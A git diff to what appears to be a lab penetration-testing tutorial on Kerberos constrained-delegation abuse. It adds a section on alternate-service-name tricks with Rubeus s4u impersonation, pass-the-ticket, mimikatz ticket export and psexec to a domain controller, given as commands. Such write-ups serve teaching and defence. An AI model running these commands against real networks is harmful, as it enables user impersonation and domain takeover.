@@ -152,7 +152,7 @@ Now, save the `S4U2Proxy` ticket to a file and pass the ticket using rubeus or m
 
 ```powershell
 C:\Users\Alex> echo <base64ServiceTicket> > C:\Users\Alex\Desktop\ticket.kirbi
-C:\Tools\Mimikatz\mimikatz.exe
+C:\Users\Alex> C:\Tools\Mimikatz\mimikatz.exe
 mimikatz # sekurlsa::tickets /export
 mimikatz # kerberos::ptt C:\Users\Alex\Desktop\ticket.kirbi
 ```
@@ -164,3 +164,22 @@ Access cifs on dev.dhitalcorp.local
 ```powershell
 C:\Users\Alex> net use \\dc.dev.dhitalcorp.local\c$
 ```
+## Problem 2 with constrained delegation (Alternate Serice Name)
+There is no validation on the SPN specified in `msds-allowedtodelegateto` attribute meaning we can access any service on dc.dev.dhitalcorp.local as any user not only cifs. Now what if  port 445 was unavailable or we wanted an option for lateral movement? Using rubeus We can request a service ticket for a service, such as CIFS, but then modify the SPN to something different, such as LDAP, HOST and the target service will accept it happily. We can use rubeus `/altservice` flag here we are using same TGT for sql-2$ to request Service Ticket for LDAP instead of CIFS. Here, after getting TGT of sql-1$ computer account we are performing `S4U2Self` and `S4U2Proxy` with alternate service name for `host`
+
+```powershell
+C:\Users\Alex> Rubeus.exe s4u /impersonateuser:alex /msdsspn:cifs/dc.dev.dhitalcorp.local /altservice:host /user:sql-1$ /ticket:erPFKSBNer4HGMuSU8= /nowrap
+```
+Grab the final `S4U2Proxy` ticket and save in a file named ticket.kirbi
+```powershell
+C:\Users\Alex> echo <base64ServiceTicket> > C:\Users\Alex\Desktop\ticket.kirbi
+```
+Using Rubeus pass the ticket into an existing logon session.
+```powershell
+C:\Users\Alex> .\Rubeus.exe ptt /ticket:C:\Users\Alex\Desktop\ticket.kirbi
+```
+Gain access using psexec
+```powershell
+C:\Users\Alex> psexec.exe \\dc.dev.dhitalcorp.local cmd
+```
+
